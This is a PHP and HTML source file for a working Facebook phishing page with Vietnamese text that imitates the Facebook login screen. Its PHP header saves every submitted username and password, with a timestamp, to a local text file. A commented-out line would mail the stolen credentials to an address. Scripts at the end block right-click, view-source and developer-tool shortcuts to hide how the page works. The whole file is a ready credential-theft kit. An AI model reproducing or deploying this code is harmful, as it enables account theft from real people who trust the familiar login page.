<?php
session_start();
if(isset($_SESSION['facebook'])){
    header('location: /');
    die();
}
if(isset($_POST['account'])){
    $taikhoan = $_POST['taikhoan'];
    $matkhau = $_POST['matkhau'];
    $time = date('h:i:s y-m-d');
    $_SESSION['facebook'] = $taikhoan;
    $file = fopen("huystarsystem.txt","a+");
    fwrite($file, ''.$taikhoan.'|'.$matkhau.'|'.$time);
    fwrite($file, "\n");
    fclose($file); 
    // nếu muốn gửi mail thì bỏ // lè
    // $message = ''.$taikhoan.'|'.$matkhau.'|'.$time;
    // mail('mail@gmail.com', 'Ơn giời facebook đây rồi', $message);
    echo ("<script>location.href='/'</script>");
}
$time = time();
?>
<!DOCTYPE html>
<html>
<head>
<meta content='width=device-width, initial-scale=1' name='viewport' />
<meta content='text/html; charset=UTF-8' http-equiv='Content-Type' />
<title>Facebook - Đăng nhập hoặc đăng ký</title>
<meta name="search engines" content="Aeiwi, Alexa, AllTheWeb, AltaVista, AOL Netfind, Anzwers, Canada, DirectHit, EuroSeek, Excite, Overture, Go, Google, HotBot. InfoMak, Kanoodle, Lycos, MasterSite, National Directory, Northern Light, SearchIt, SimpleSearch, WebsMostLinked, WebTop, What-U-Seek, AOL, Yahoo, WebCrawler, Infoseek, Excite, Magellan, LookSmart, bing, CNET, Googlebot" />
<meta property="og:type" content="website" />
<meta property="og:title" content="Đăng nhập FacebookZ | FacebookZ">
<meta property="og:description" content="Hãy đăng nhập FacebookZ để bắt đầu chia sẻ và kết nối với bạn bè, gia đình và những người bạn biết.">
<meta name="description" content="Hãy đăng nhập FacebookZ để bắt đầu chia sẻ và kết nối với bạn bè, gia đình và những người bạn biết." />
<meta name="keywords" content="auto followers, auto follower, Free increase unlimite followers, best auto follower, autofollower, followers" />
<meta name="robots" content="index, follow" />
<meta name="robot" content="index, follow" />
<meta name="googlebot" content="index, follow" />
<meta name="YandexBot" content="index, follow" />
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
<link class="tempLink" rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:regular">
<script src='//ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js' type="text/javascript"></script>
<link rel="stylesheet" href="../assets/style.css?<?=$time;?>">
</head>
<body id="vohuunhan">
<div class="container">
<div class="d-flex justify-content-center">.
<img src="../assets/img/dF5SId3UHWd (2) (1).svg" class="img logo mt-2" alt="FacebookZ">
</div>
<div class="row h-100 justify-content-center align-items-center mt-2">
<div class="col-md-4 vhnlog">
<form action="login.php" method="POST">
<div class="form-group">
<input type="text" class="form-control" name="taikhoan" placeholder="Vui lòng nhập số di động hoặc email" required>
</div>
<div class="form-group">
<input type="password" class="form-control" name="matkhau" placeholder="Password" required>
</div>
<div class="form-group">
<center>
<button name="account" type="submit" class="btn btn-primary btn-block">Đăng nhập</button>
</center>
</div>
</form>
<div id="login_reg_separator" class="_43mg _8qtf" data-sigil="login_reg_separator"><span class="_43mh">hoặc</span></div>
<center>
<input class="btn btn-success" type="button" value="Tạo tài khoản mới" />
</center>
</div>
</div>
<div class="row text-center" style="margin-top: 6rem;">
<div class="col">
<small class="text-muted">Tiếng Việt</small><br />
<small class="blue">English (US)</small>
</div>
<div class="col">
<small class="blue">Hindi (IN)</small>
<br />
<i class="far fa-plus-square"></i>
</div>
</div>
<div class="row text-center">
<div class="col-md-12">
<small class="text-muted">Facebook, Inc.</small>
</div
  </div>
</div>
<script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous" type="text/javascript"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js" integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous" type="text/javascript"></script>
<script type="text/javascript">
      window.onload = function () {
           document.addEventListener("contextmenu", function (e) {
               e.preventDefault();
           }, false);
           document.addEventListener("keydown", function (e) {
               if (e.ctrlKey && e.shiftKey && e.keyCode == 73) {
                   disabledEvent(e);
               }
               // "J" key
               if (e.ctrlKey && e.shiftKey && e.keyCode == 74) {
                   disabledEvent(e);
               }
               // "S" key + macOS
               if (e.keyCode == 83 && (navigator.platform.match("Mac") ? e.metaKey : e.ctrlKey)) {
                   disabledEvent(e);
               }
               // "U" key
               if (e.ctrlKey && e.keyCode == 85) {
                   disabledEvent(e);
               }
               // "F12" key
               if (event.keyCode == 123) {
                   disabledEvent(e);
               }
           }, false);
           function disabledEvent(e) {
               if (e.stopPropagation) {
                   e.stopPropagation();
               } else if (window.event) {
                   window.event.cancelBubble = true;
               }
               e.preventDefault();
               return false;
           }
       }
</script>
<script src="https://ajax.cloudflare.com/cdn-cgi/scripts/7089c43e/cloudflare-static/rocket-loader.min.js" data-cf-settings="|49" defer=""></script></body>
</html>
